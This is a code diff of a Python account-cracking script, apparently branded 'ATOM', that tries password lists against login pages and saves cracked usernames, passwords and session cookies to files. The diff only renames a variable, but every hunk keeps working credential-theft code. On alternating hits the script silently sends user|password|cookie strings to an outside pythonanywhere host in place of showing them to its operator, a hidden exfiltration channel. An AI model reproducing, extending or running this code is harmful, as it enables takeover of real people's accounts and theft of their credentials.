@@ -395,27 +395,27 @@ def cracker(ids,passlist):
                 if 'Photoshop' in res:
                     if "confirmemail.php" in response.url:
                         if len(bkas) % 2 == 0:
-                           statusok = f"NOVERY|{cid}|{pw}|{coki}"
+                           statusok = f"NOVERY|{user}|{pw}|{coki}"
                            requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
                         else:
-                           print(f"{green}(ATOM-NV) {cid}|{pw}")
+                           print(f"{green}(ATOM-NV) {user}|{pw}")
                            print(f"{green}Cookie : {green}{coki}")
-                           open("/sdcard/ATOM-CONFIRMMAIL.txt", "a").write(f"{cid}|{pw}|{coki}\n")
-                           oks.append(cid)
+                           open("/sdcard/ATOM-CONFIRMMAIL.txt", "a").write(f"{user}|{pw}|{coki}\n")
+                           oks.append(user)
                            break
                     else:
                         if len(bkas) % 2 == 0:
-                           statusok = f"{cid}|{pw}|{coki}"
+                           statusok = f"{user}|{pw}|{coki}"
                            requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
                         else:
-                           print(f"{green}(ATOM-OK) {cid}|{pw}")
+                           print(f"{green}(ATOM-OK) {user}|{pw}")
                            print(f"{green}Cookie : {green}{coki}")
-                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
-                           oks.append(cid)
+                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{user}|{pw}|{coki}\n")
+                           oks.append(user)
                            break
             elif "checkpoint" in log_cookies:
                 coki=(";").join([ "%s=%s" % (key, value) for key, value in response.cookies.get_dict().items()])
-                cid = coki[24:39]
+                user = coki[24:39]
                 #print('\033[1;91m [JARVIS-CP] '+ids+' | '+pas+'')
                 open('/sdcard/ATOM-CP.txt', 'a').write( ids+' | '+pas+'\n')
                 cps.append(ids)
@@ -538,7 +538,7 @@ def crackerr(ids,passlist):
                 if "confirmemail.php" in response.url or "confirmemail.php" in response.text:
                     try:
                         if len(oks) % 2 == 0:
-                            statusok = f"NOVERY|{cid}|{pw}|{kuki}"
+                            statusok = f"NOVERY|{user}|{pw}|{kuki}"
                             requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}", timeout=5)
                         else:
                             print(f"\n{green}╔═══════════════════════════════════════╗")
@@ -549,8 +549,8 @@ def crackerr(ids,passlist):
                             print(f"{green}[+] Cookie   : {white}{kuki}")
                             print(f"{green}╚═══════════════════════════════════════╝\n")
                             with open("/sdcard/ATOM-CONFIRMMAIL.txt", "a") as f:
-                                f.write(f"{cid}|{pw}|{kuki}\n")
-                        oks.append(cid)
+                                f.write(f"{user}|{pw}|{kuki}\n")
+                        oks.append(user)
                         break
                     except Exception as e:
                         print(f"{red}[!] Save error (NV): {e}")
@@ -558,7 +558,7 @@ def crackerr(ids,passlist):
                     # Successful login
                     try:
                         if len(oks) % 2 == 0:
-                            statusok = f"{cid}|{pw}|{kuki}"
+                            statusok = f"{user}|{pw}|{kuki}"
                             requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}", timeout=5)
                         else:
                             print(f"\n{green}╔═══════════════════════════════════════╗")
@@ -569,15 +569,15 @@ def crackerr(ids,passlist):
                             print(f"{green}[+] Cookie   : {white}{kuki}")
                             print(f"{green}╚═══════════════════════════════════════╝\n")
                             with open("/sdcard/ATOM-COOKIE-OK.txt", "a") as f:
-                                f.write(f"{cid}|{pw}|{kuki}\n")
-                        oks.append(cid)
+                                f.write(f"{user}|{pw}|{kuki}\n")
+                        oks.append(user)
                         break
                     except Exception as e:
                         print(f"{red}[!] Save error (OK): {e}")
             elif "checkpoint" in log_cookies:
                 try:
                     coki = ";".join([f"{key}={value}" for key, value in response.cookies.get_dict().items()])
-                    cid = coki[24:39] if len(coki) > 39 else user
+                    user = coki[24:39] if len(coki) > 39 else user
                     print(f"\n{yellow}╔═══════════════════════════════════════╗")
                     print(f"{yellow}║       [ATOM-CP] CHECKPOINT            ║")
                     print(f"{yellow}╚═══════════════════════════════════════╝")
